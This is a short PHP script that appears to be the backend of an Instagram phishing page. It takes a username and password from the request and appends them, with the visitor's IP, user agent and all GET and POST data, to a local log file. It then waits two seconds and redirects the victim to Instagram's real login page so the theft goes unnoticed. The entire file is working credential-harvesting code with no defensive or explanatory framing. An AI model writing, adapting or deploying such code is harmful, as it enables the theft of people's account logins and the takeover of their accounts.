<?php

    $username=$_GET['username'];
    $password=$_GET['password'];

    date_default_timezone_set('Asia/Tehran');

$logFile = __DIR__ . '/requests.log';

$ip =
    $_SERVER['HTTP_X_FORWARDED_FOR']
    ?? $_SERVER['REMOTE_ADDR']
    ?? 'UNKNOWN';

$data = [
    'time'   => date('Y-m-d H:i:s'),
    'ip'     => $ip,
    'method' => $_SERVER['REQUEST_METHOD'],
    'uri'    => $_SERVER['REQUEST_URI'],
    'agent'  => $_SERVER['HTTP_USER_AGENT'] ?? '-',
    'get'    => $_GET,
    'post'   => $_POST
];

file_put_contents(
    $logFile,
    json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL,
    FILE_APPEND | LOCK_EX
);
    
    sleep(2);
    header("Location: https://www.instagram.com/accounts/login");
    exit();
        


?>
